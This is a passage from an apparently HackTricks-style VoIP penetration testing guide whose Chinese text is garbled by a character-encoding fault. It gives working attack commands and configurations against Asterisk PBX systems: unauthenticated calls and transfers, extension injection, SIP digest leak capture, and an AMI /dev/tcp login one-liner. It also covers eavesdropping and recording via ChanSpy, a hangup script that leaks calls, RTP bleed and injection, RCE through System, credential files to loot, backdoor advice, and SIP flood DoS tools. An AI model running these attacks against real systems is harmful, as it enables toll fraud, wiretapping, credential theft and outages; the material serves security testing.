*   **`SIPPTS invite`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite æ£€æŸ¥ **PBX æœåŠ¡å™¨æ˜¯å¦å…è®¸æˆ‘ä»¬åœ¨æ²¡æœ‰è®¤è¯çš„æƒ…å†µä¸‹æ‹¨æ‰“ç”µè¯**ã€‚å¦‚æœ SIP æœåŠ¡å™¨é…ç½®ä¸æ­£ç¡®ï¼Œå®ƒå°†å…è®¸æˆ‘ä»¬æ‹¨æ‰“å¤–éƒ¨å·ç ã€‚å®ƒè¿˜å¯ä»¥å…è®¸æˆ‘ä»¬å°†é€šè¯è½¬ç§»åˆ°ç¬¬äºŒä¸ªå¤–éƒ¨å·ç ã€‚

ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨çš„ Asterisk æœåŠ¡å™¨æœ‰ä¸è‰¯çš„ä¸Šä¸‹æ–‡é…ç½®ï¼Œæ‚¨å¯ä»¥åœ¨æ²¡æœ‰æˆæƒçš„æƒ…å†µä¸‹æ¥å— INVITE è¯·æ±‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸çŸ¥é“ä»»ä½•ç”¨æˆ·/å¯†ç çš„æƒ…å†µä¸‹æ‹¨æ‰“ç”µè¯ã€‚

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### å…è´¹ç”µè¯ / é…ç½®é”™è¯¯çš„ IVRS

IVRS ä»£è¡¨ **äº¤äº’å¼è¯­éŸ³å“åº”ç³»ç»Ÿ**ï¼Œæ˜¯ä¸€ç§ç”µè¯æŠ€æœ¯ï¼Œå…è®¸ç”¨æˆ·é€šè¿‡è¯­éŸ³æˆ–æŒ‰é”®è¾“å…¥ä¸è®¡ç®—æœºç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚IVRS ç”¨äºæ„å»º **è‡ªåŠ¨å‘¼å«å¤„ç†** ç³»ç»Ÿï¼Œæä¾›ä¸€ç³»åˆ—åŠŸèƒ½ï¼Œå¦‚æä¾›ä¿¡æ¯ã€è·¯ç”±ç”µè¯å’Œæ•è·ç”¨æˆ·è¾“å…¥ã€‚

VoIP ç³»ç»Ÿä¸­çš„ IVRS é€šå¸¸åŒ…æ‹¬ï¼š

1. **è¯­éŸ³æç¤º**ï¼šå¼•å¯¼ç”¨æˆ·é€šè¿‡ IVR èœå•é€‰é¡¹å’Œè¯´æ˜çš„é¢„å½•éŸ³é¢‘æ¶ˆæ¯ã€‚
2. **DTMF**ï¼ˆåŒéŸ³å¤šé¢‘ï¼‰ä¿¡å·ï¼šé€šè¿‡æŒ‰ä¸‹ç”µè¯ä¸Šçš„æŒ‰é”®ç”Ÿæˆçš„è§¦æ‘¸éŸ³è¾“å…¥ï¼Œç”¨äºåœ¨ IVR èœå•ä¸­å¯¼èˆªå’Œæä¾›è¾“å…¥ã€‚
3. **å‘¼å«è·¯ç”±**ï¼šæ ¹æ®ç”¨æˆ·è¾“å…¥å°†ç”µè¯ç›´æ¥è½¬æ¥åˆ°é€‚å½“çš„ç›®çš„åœ°ï¼Œå¦‚ç‰¹å®šéƒ¨é—¨ã€ä»£ç†æˆ–åˆ†æœºã€‚
4. **ç”¨æˆ·è¾“å…¥æ•è·**ï¼šæ”¶é›†æ¥ç”µè€…çš„ä¿¡æ¯ï¼Œå¦‚è´¦æˆ·å·ç ã€æ¡ˆä»¶ ID æˆ–ä»»ä½•å…¶ä»–ç›¸å…³æ•°æ®ã€‚
5. **ä¸å¤–éƒ¨ç³»ç»Ÿçš„é›†æˆ**ï¼šå°† IVR ç³»ç»Ÿè¿æ¥åˆ°æ•°æ®åº“æˆ–å…¶ä»–è½¯ä»¶ç³»ç»Ÿï¼Œä»¥è®¿é—®æˆ–æ›´æ–°ä¿¡æ¯ã€æ‰§è¡Œæ“ä½œæˆ–è§¦å‘äº‹ä»¶ã€‚

åœ¨ Asterisk VoIP ç³»ç»Ÿä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨æ‹¨å·è®¡åˆ’ï¼ˆ**`extensions.conf`** æ–‡ä»¶ï¼‰å’Œå„ç§åº”ç”¨ç¨‹åºï¼ˆå¦‚ `Background()`ã€`Playback()`ã€`Read()` ç­‰ï¼‰åˆ›å»º IVRã€‚è¿™äº›åº”ç”¨ç¨‹åºå¸®åŠ©æ‚¨æ’­æ”¾è¯­éŸ³æç¤ºã€æ•è·ç”¨æˆ·è¾“å…¥å¹¶æ§åˆ¶å‘¼å«æµç¨‹ã€‚

#### æ¼æ´é…ç½®ç¤ºä¾‹
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
ä¹‹å‰çš„ä¾‹å­ä¸­ï¼Œç”¨æˆ·è¢«è¦æ±‚**æŒ‰1æ‹¨æ‰“**ä¸€ä¸ªéƒ¨é—¨ï¼Œ**æŒ‰2æ‹¨æ‰“**å¦ä¸€ä¸ªéƒ¨é—¨ï¼Œæˆ–è€…**å¦‚æœä»–çŸ¥é“å®Œæ•´çš„åˆ†æœºå·**ï¼Œåˆ™è¾“å…¥å®Œæ•´çš„åˆ†æœºå·ã€‚\
æ¼æ´åœ¨äºæ‰€æŒ‡ç¤ºçš„**åˆ†æœºé•¿åº¦æ²¡æœ‰è¢«æ£€æŸ¥ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥è¾“å…¥5ç§’è¶…æ—¶çš„å®Œæ•´å·ç å¹¶è¿›è¡Œæ‹¨æ‰“ã€‚**

### åˆ†æœºæ³¨å…¥

ä½¿ç”¨å¦‚ä¸‹åˆ†æœºï¼š
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
å½“ **`${EXTEN}`** æ˜¯å°†è¢«æ‹¨æ‰“çš„ **åˆ†æœº** æ—¶ï¼Œå½“ **ext 101 è¢«å¼•å…¥** æ—¶ï¼Œå°†ä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š
```scss
exten => 101,1,Dial(SIP/101)
```
ç„¶è€Œï¼Œå¦‚æœ **`${EXTEN}`** å…è®¸è¾“å…¥ **è¶…è¿‡æ•°å­—**ï¼ˆå¦‚åœ¨æ—§ç‰ˆ Asterisk ä¸­ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥è¾“å…¥ **`101&SIP123123123`** æ¥æ‹¨æ‰“ç”µè¯å·ç  123123123ã€‚è¿™å°†æ˜¯ç»“æœï¼š
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
å› æ­¤ï¼Œå¯¹åˆ†æœº **`101`** å’Œ **`123123123`** çš„å‘¼å«å°†è¢«å‘é€ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ¥åˆ°ç”µè¯çš„åˆ†æœºä¼šå»ºç«‹è¿æ¥â€¦â€¦ä½†æ˜¯å¦‚æœæ”»å‡»è€…ä½¿ç”¨ä¸€ä¸ª **ç»•è¿‡ä»»ä½•åŒ¹é…** çš„åˆ†æœºï¼Œè¯¥åˆ†æœºå¹¶ä¸å­˜åœ¨ï¼Œä»–å¯ä»¥ **ä»…å‘æ‰€éœ€å·ç æ³¨å…¥ä¸€ä¸ªå‘¼å«**ã€‚

## SIPDigestLeak æ¼æ´

SIP Digest Leak æ˜¯ä¸€ä¸ªå½±å“å¤§é‡ SIP ç”µè¯çš„æ¼æ´ï¼ŒåŒ…æ‹¬ç¡¬ä»¶å’Œè½¯ä»¶ IP ç”µè¯ä»¥åŠç”µè¯é€‚é…å™¨ï¼ˆVoIP è½¬æ¨¡æ‹Ÿï¼‰ã€‚è¯¥æ¼æ´å…è®¸ **æ³„éœ² Digest è®¤è¯å“åº”**ï¼Œè¯¥å“åº”æ˜¯æ ¹æ®å¯†ç è®¡ç®—çš„ã€‚ç„¶åå¯ä»¥è¿›è¡Œ **ç¦»çº¿å¯†ç æ”»å‡»**ï¼Œå¹¶æ ¹æ®æŒ‘æˆ˜å“åº”æ¢å¤å¤§å¤šæ•°å¯†ç ã€‚

**[æ¼æ´åœºæ™¯æ¥è‡ªè¿™é‡Œ**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. ä¸€éƒ¨ IP ç”µè¯ï¼ˆå—å®³è€…ï¼‰åœ¨ä»»ä½•ç«¯å£ä¸Šç›‘å¬ï¼ˆä¾‹å¦‚ï¼š5060ï¼‰ï¼Œæ¥å—ç”µè¯å‘¼å«
2. æ”»å‡»è€…å‘ IP ç”µè¯å‘é€ INVITE
3. å—å®³è€…ç”µè¯å¼€å§‹å“é“ƒï¼Œæœ‰äººæ¥å¬å¹¶æŒ‚æ–­ï¼ˆå› ä¸ºå¦ä¸€ç«¯æ²¡æœ‰äººæ¥ç”µè¯ï¼‰
4. å½“ç”µè¯æŒ‚æ–­æ—¶ï¼Œ**å—å®³è€…ç”µè¯å‘æ”»å‡»è€…å‘é€ BYE**
5. **æ”»å‡»è€…å‘å‡º 407 å“åº”**ï¼Œ**è¯·æ±‚è®¤è¯**å¹¶å‘å‡ºè®¤è¯æŒ‘æˆ˜
6. **å—å®³è€…ç”µè¯åœ¨ç¬¬äºŒä¸ª BYE ä¸­æä¾›å¯¹è®¤è¯æŒ‘æˆ˜çš„å“åº”**
7. **æ”»å‡»è€…å¯ä»¥åœ¨ä»–çš„æœ¬åœ°æœºå™¨ä¸Šï¼ˆæˆ–åˆ†å¸ƒå¼ç½‘ç»œç­‰ï¼‰å¯¹æŒ‘æˆ˜å“åº”è¿›è¡Œæš´åŠ›ç ´è§£æ”»å‡»**å¹¶çŒœæµ‹å¯†ç 

* **SIPPTS æ¼æ´**æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS æ¼æ´åˆ©ç”¨äº†å½±å“å¤§é‡ SIP ç”µè¯çš„ SIP Digest Leak æ¼æ´ã€‚è¾“å‡ºå¯ä»¥ä»¥ SipCrack æ ¼å¼ä¿å­˜ï¼Œä»¥ä¾¿ä½¿ç”¨ SIPPTS dcrack æˆ– SipCrack å·¥å…·è¿›è¡Œæš´åŠ›ç ´è§£ã€‚
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call å…è®¸ä¸€ä¸ª **ç½‘ç»œç”¨æˆ·**ï¼ˆä¾‹å¦‚å¯èƒ½å¯¹æŸä¸ªäº§å“æ„Ÿå…´è¶£ï¼‰ **æä¾›** ä»–çš„ **ç”µè¯å·ç ** ä»¥æ¥æ”¶ç”µè¯ã€‚ç„¶åä¼šæ‹¨æ‰“ä¸€ä¸ªå•†ä¸šç”µè¯ï¼Œå½“ä»– **æ¥å¬ç”µè¯** æ—¶ï¼Œç”¨æˆ·å°† **è¢«å‘¼å«å¹¶ä¸ä»£ç†è¿æ¥**ã€‚

ä¸€ä¸ªå¸¸è§çš„ Asterisk é…ç½®æ–‡ä»¶æ˜¯ï¼š
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* ä¹‹å‰çš„é…ç½®å…è®¸ **ä»»ä½• IP åœ°å€è¿æ¥**ï¼ˆå¦‚æœå¯†ç å·²çŸ¥ï¼‰ã€‚
* è¦ **ç»„ç»‡ä¸€ä¸ªç”µè¯**ï¼Œå¦‚å‰æ‰€è¿°ï¼Œ**ä¸éœ€è¦è¯»å–æƒé™**ï¼Œ**åªéœ€è¦** **åœ¨å†™å…¥ä¸­** **å‘èµ·**ã€‚

æ‹¥æœ‰è¿™äº›æƒé™çš„ä»»ä½•çŸ¥é“å¯†ç çš„ IP éƒ½å¯ä»¥è¿æ¥å¹¶æå–è¿‡å¤šä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**æ›´å¤šä¿¡æ¯æˆ–æ“ä½œå¯ä»¥è¢«è¯·æ±‚ã€‚**

### **çªƒå¬**

åœ¨ Asterisk ä¸­ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ **`ChanSpy`** æŒ‡å®šè¦ç›‘æ§çš„ **åˆ†æœº**ï¼ˆæˆ–æ‰€æœ‰åˆ†æœºï¼‰æ¥å¬å–æ­£åœ¨è¿›è¡Œçš„å¯¹è¯ã€‚æ­¤å‘½ä»¤éœ€è¦åˆ†é…ç»™ä¸€ä¸ªåˆ†æœºã€‚

ä¾‹å¦‚ï¼Œ**`exten => 333,1,ChanSpy('all',qb)`** è¡¨ç¤ºå¦‚æœä½  **æ‹¨æ‰“** **åˆ†æœº 333**ï¼Œå®ƒå°† **ç›‘æ§** **`all`** çš„åˆ†æœºï¼Œ**å¼€å§‹ç›‘å¬** æ¯å½“æ–°çš„å¯¹è¯å¼€å§‹æ—¶ (**`b`**) ä»¥é™éŸ³æ¨¡å¼ (**`q`**) è¿›è¡Œï¼Œå› ä¸ºæˆ‘ä»¬ä¸æƒ³è¿›è¡Œäº’åŠ¨ã€‚ä½ å¯ä»¥é€šè¿‡æŒ‰ **`*`** æˆ–è¾“å…¥åˆ†æœºå·ç åœ¨è¿›è¡Œçš„å¯¹è¯ä¹‹é—´åˆ‡æ¢ã€‚

ä¹Ÿå¯ä»¥ä½¿ç”¨ **`ExtenSpy`** ä»…ç›‘æ§ä¸€ä¸ªåˆ†æœºã€‚

é™¤äº†ç›‘å¬å¯¹è¯å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨åˆ†æœºå°†å…¶ **å½•åˆ¶åˆ°æ–‡ä»¶ä¸­**ï¼Œä¾‹å¦‚ï¼š 

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

é€šè¯å°†ä¿å­˜åœ¨ **`/tmp`**ã€‚

æ‚¨ç”šè‡³å¯ä»¥è®© Asterisk **åœ¨é€šè¯ç»“æŸæ—¶æ‰§è¡Œä¸€ä¸ªè„šæœ¬ä»¥æ³„éœ²é€šè¯**ã€‚
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed æ¼æ´

**RTCPBleed** æ˜¯ä¸€ä¸ªå½±å“åŸºäº Asterisk çš„ VoIP æœåŠ¡å™¨çš„é‡å¤§å®‰å…¨é—®é¢˜ï¼ˆå‘å¸ƒäº 2017 å¹´ï¼‰ã€‚è¯¥æ¼æ´å…è®¸ **RTPï¼ˆå®æ—¶ä¼ è¾“åè®®ï¼‰æµé‡**ï¼Œå³æ‰¿è½½ VoIP é€šè¯çš„æµé‡ï¼Œè¢« **äº’è”ç½‘ä¸Šçš„ä»»ä½•äººæ‹¦æˆªå’Œé‡å®šå‘**ã€‚è¿™æ˜¯å› ä¸º RTP æµé‡åœ¨é€šè¿‡ NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰é˜²ç«å¢™æ—¶ç»•è¿‡äº†èº«ä»½éªŒè¯ã€‚

RTP ä»£ç†å°è¯•é€šè¿‡åœ¨ä¸¤ä¸ªæˆ–å¤šä¸ªå‚ä¸è€…ä¹‹é—´ä»£ç† RTP æµæ¥è§£å†³å½±å“ RTC ç³»ç»Ÿçš„ **NAT é™åˆ¶**ã€‚å½“ NAT å­˜åœ¨æ—¶ï¼ŒRTP ä»£ç†è½¯ä»¶é€šå¸¸æ— æ³•ä¾èµ–é€šè¿‡ä¿¡ä»¤ï¼ˆä¾‹å¦‚ SIPï¼‰è·å–çš„ RTP IP å’Œç«¯å£ä¿¡æ¯ã€‚å› æ­¤ï¼Œä¸€äº› RTP ä»£ç†å®ç°äº†ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—è¿™æ ·çš„ **IP å’Œç«¯å£å…ƒç»„èƒ½å¤Ÿè‡ªåŠ¨å­¦ä¹ **ã€‚è¿™é€šå¸¸æ˜¯é€šè¿‡æ£€æŸ¥ä¼ å…¥çš„ RTP æµé‡å¹¶å°†ä»»ä½•ä¼ å…¥ RTP æµé‡çš„æº IP å’Œç«¯å£æ ‡è®°ä¸ºåº”å“åº”çš„æ¥å®Œæˆçš„ã€‚è¿™ç§æœºåˆ¶å¯èƒ½è¢«ç§°ä¸ºâ€œå­¦ä¹ æ¨¡å¼â€ï¼Œ**ä¸ä½¿ç”¨ä»»ä½•å½¢å¼çš„èº«ä»½éªŒè¯**ã€‚å› æ­¤ï¼Œ**æ”»å‡»è€…** å¯ä»¥ **å‘ RTP ä»£ç†å‘é€ RTP æµé‡**ï¼Œå¹¶æ¥æ”¶åŸæœ¬åº”å‘é€ç»™æ­£åœ¨è¿›è¡Œçš„ RTP æµçš„å‘¼å«è€…æˆ–è¢«å‘¼å«è€…çš„ä»£ç† RTP æµé‡ã€‚æˆ‘ä»¬ç§°è¿™ç§æ¼æ´ä¸º RTP Bleedï¼Œå› ä¸ºå®ƒå…è®¸æ”»å‡»è€…æ¥æ”¶åŸæœ¬åº”å‘é€ç»™åˆæ³•ç”¨æˆ·çš„ RTP åª’ä½“æµã€‚

RTP ä»£ç†å’Œ RTP å †æ ˆçš„å¦ä¸€ä¸ªæœ‰è¶£è¡Œä¸ºæ˜¯ï¼Œæœ‰æ—¶ **å³ä½¿ä¸æ˜“å— RTP Bleed æ¼æ´å½±å“**ï¼Œå®ƒä»¬ä»ä¼š **æ¥å—ã€è½¬å‘å’Œ/æˆ–å¤„ç†æ¥è‡ªä»»ä½•æºçš„ RTP æ•°æ®åŒ…**ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ RTP æ•°æ®åŒ…ï¼Œè¿™å¯èƒ½å…è®¸ä»–ä»¬æ³¨å…¥è‡ªå·±çš„åª’ä½“ï¼Œè€Œä¸æ˜¯åˆæ³•çš„åª’ä½“ã€‚æˆ‘ä»¬ç§°è¿™ç§æ”»å‡»ä¸º RTP æ³¨å…¥ï¼Œå› ä¸ºå®ƒå…è®¸å°†ä¸åˆæ³•çš„ RTP æ•°æ®åŒ…æ³¨å…¥åˆ°ç°æœ‰çš„ RTP æµä¸­ã€‚æ­¤æ¼æ´å¯èƒ½åœ¨ RTP ä»£ç†å’Œç«¯ç‚¹ä¸­å‘ç°ã€‚

Asterisk å’Œ FreePBX ä¼ ç»Ÿä¸Šä½¿ç”¨ **`NAT=yes` è®¾ç½®**ï¼Œè¿™ä½¿å¾— RTP æµé‡èƒ½å¤Ÿç»•è¿‡èº«ä»½éªŒè¯ï¼Œå¯èƒ½å¯¼è‡´é€šè¯ä¸­æ²¡æœ‰éŸ³é¢‘æˆ–å•å‘éŸ³é¢‘ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

* **`SIPPTS rtpbleed`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed é€šè¿‡å‘é€ RTP æµæ¥æ£€æµ‹ RTP Bleed æ¼æ´ã€‚
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`**æ¥è‡ª[**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed é€šè¿‡å‘é€ RTCP æµæ¥æ£€æµ‹ RTP Bleed æ¼æ´ã€‚
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood åˆ©ç”¨ RTP Bleed æ¼æ´å‘é€ RTP æµã€‚
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject åˆ©ç”¨ RTP Bleed æ¼æ´æ³¨å…¥éŸ³é¢‘æ–‡ä»¶ï¼ˆWAV æ ¼å¼ï¼‰ã€‚
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

åœ¨ Asterisk ä¸­ï¼Œå¦‚æœä½ ä»¥æŸç§æ–¹å¼èƒ½å¤Ÿ **æ·»åŠ æ‰©å±•è§„åˆ™å¹¶é‡æ–°åŠ è½½å®ƒä»¬**ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡æ”»é™·ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç½‘ç»œç®¡ç†æœåŠ¡å™¨ï¼‰ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ **`System`** å‘½ä»¤è·å¾— RCEã€‚
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
æœ‰ä¸€ä¸ªå‘½ä»¤å« **`Shell`**ï¼Œå¯ä»¥åœ¨å¿…è¦æ—¶ **æ›¿ä»£ `System`** æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚

{% hint style="warning" %}
å¦‚æœæœåŠ¡å™¨ **ä¸å…è®¸åœ¨ `System`** å‘½ä»¤ä¸­ä½¿ç”¨æŸäº›å­—ç¬¦ï¼ˆå¦‚åœ¨ Elastix ä¸­ï¼‰ï¼Œè¯·æ£€æŸ¥ç½‘ç»œæœåŠ¡å™¨æ˜¯å¦å…è®¸ **ä»¥æŸç§æ–¹å¼åœ¨ç³»ç»Ÿå†…éƒ¨åˆ›å»ºæ–‡ä»¶**ï¼ˆå¦‚åœ¨ Elastix æˆ– trixbox ä¸­ï¼‰ï¼Œå¹¶åˆ©ç”¨å®ƒ **åˆ›å»ºä¸€ä¸ªåé—¨è„šæœ¬**ï¼Œç„¶åä½¿ç”¨ **`System`** æ¥ **æ‰§è¡Œ** è¯¥ **è„šæœ¬**ã€‚
{% endhint %}

#### æœ‰è¶£çš„æœ¬åœ°æ–‡ä»¶å’Œæƒé™

* **`sip.conf`** -> åŒ…å« SIP ç”¨æˆ·çš„å¯†ç ã€‚
* å¦‚æœ **Asterisk æœåŠ¡å™¨ä»¥ root èº«ä»½è¿è¡Œ**ï¼Œæ‚¨å¯èƒ½ä¼šå±å®³ rootã€‚
* **mysql root ç”¨æˆ·** å¯èƒ½ **æ²¡æœ‰ä»»ä½•å¯†ç **ã€‚
* è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ mysql ç”¨æˆ·ä½œä¸ºåé—¨ã€‚
* **`FreePBX`**
* **`amportal.conf`** -> åŒ…å«ç½‘ç»œé¢æ¿ç®¡ç†å‘˜ï¼ˆFreePBXï¼‰çš„å¯†ç ã€‚
* **`FreePBX.conf`** -> åŒ…å«ç”¨äºè®¿é—®æ•°æ®åº“çš„ç”¨æˆ· FreePBXuser çš„å¯†ç ã€‚
* è¿™å¯ä»¥ç”¨æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„ mysql ç”¨æˆ·ä½œä¸ºåé—¨ã€‚
* **`Elastix`**
* **`Elastix.conf`** -> åŒ…å«å¤šä¸ªæ˜æ–‡å¯†ç ï¼Œå¦‚ mysql root å¯†ç ã€IMAPd å¯†ç ã€ç½‘ç»œç®¡ç†å‘˜å¯†ç ã€‚
* **å¤šä¸ªæ–‡ä»¶å¤¹** å°†å±äºè¢«æ”»é™·çš„ asterisk ç”¨æˆ·ï¼ˆå¦‚æœä¸æ˜¯ä»¥ root èº«ä»½è¿è¡Œï¼‰ã€‚è¯¥ç”¨æˆ·å¯ä»¥è¯»å–ä¹‹å‰çš„æ–‡ä»¶å¹¶æ§åˆ¶é…ç½®ï¼Œå› æ­¤ä»–å¯ä»¥ä½¿ Asterisk åœ¨æ‰§è¡Œæ—¶åŠ è½½å…¶ä»–åé—¨äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

### RTP æ³¨å…¥

å¯ä»¥ä½¿ç”¨å·¥å…·å¦‚ **`rtpinsertsound`**ï¼ˆ`sudo apt install rtpinsertsound`ï¼‰å’Œ **`rtpmixsound`**ï¼ˆ`sudo apt install rtpmixsound`ï¼‰åœ¨å¯¹è¯ä¸­æ’å…¥ **`.wav`** æ–‡ä»¶ã€‚

æˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨æ¥è‡ª [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) çš„è„šæœ¬æ¥ **æ‰«æå¯¹è¯**ï¼ˆ**`rtpscan.pl`**ï¼‰ã€å‘å¯¹è¯å‘é€ **`.wav`**ï¼ˆ**`rtpsend.pl`**ï¼‰å’Œ **åœ¨å¯¹è¯ä¸­æ’å…¥å™ªéŸ³**ï¼ˆ**`rtpflood.pl`**ï¼‰ã€‚

### DoS

æœ‰å‡ ç§æ–¹æ³•å¯ä»¥å°è¯•åœ¨ VoIP æœåŠ¡å™¨ä¸Šå®ç° DoSã€‚

* **`SIPPTS flood`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS flood å‘ç›®æ ‡å‘é€æ— é™æ¶ˆæ¯ã€‚
* `sippts flood -i 10.10.0.10 -m invite -v`
* **`SIPPTS ping`** æ¥è‡ª [**sippts**](https://github.com/Pepelux/sippts)**: SIPPTS ping è¿›è¡Œ SIP ping ä»¥æŸ¥çœ‹æœåŠ¡å™¨å“åº”æ—¶é—´ã€‚
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX åè®®ç”¨äº Asteriskã€‚
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): ä¸€ä¸ªç”¨äºåœ¨ UDP/IP ä¸Šæ‰§è¡Œ SIP/SDP INVITE æ¶ˆæ¯æ´ªæ°´çš„å·¥å…·ã€‚
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): å‘é€å¤šä¸ªæ ¼å¼è‰¯å¥½çš„ RTP æ•°æ®åŒ…ã€‚éœ€è¦å…ˆçŸ¥é“æ­£åœ¨ä½¿ç”¨çš„ RTP ç«¯å£ï¼ˆå…ˆå—…æ¢ï¼‰ã€‚
* [**SIPp**](https://github.com/SIPp/sipp): å…è®¸åˆ†æå’Œç”Ÿæˆ SIP æµé‡ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç”¨äº DoSã€‚
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP ç‘å£«å†›åˆ€ã€‚ä¹Ÿå¯ä»¥ç”¨äºæ‰§è¡Œ SIP æ”»å‡»ã€‚
* æ¨¡ç³Šæµ‹è¯•å·¥å…·: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### æ“ä½œç³»ç»Ÿæ¼æ´

å®‰è£…åƒ Asterisk è¿™æ ·çš„è½¯ä»¶æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä¸‹è½½ä¸€ä¸ªå·²ç»å®‰è£…äº†å®ƒçš„ **æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆ**ï¼Œä¾‹å¦‚ï¼š**FreePBX, Elastix, Trixbox**... è¿™äº›çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œä¸€æ—¦å®ƒå·¥ä½œï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯èƒ½ **ä¸ä¼šå†æ›´æ–°å®ƒä»¬**ï¼Œè€Œ **æ¼æ´** ä¼šéšç€æ—¶é—´çš„æ¨ç§»è¢«å‘ç°ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
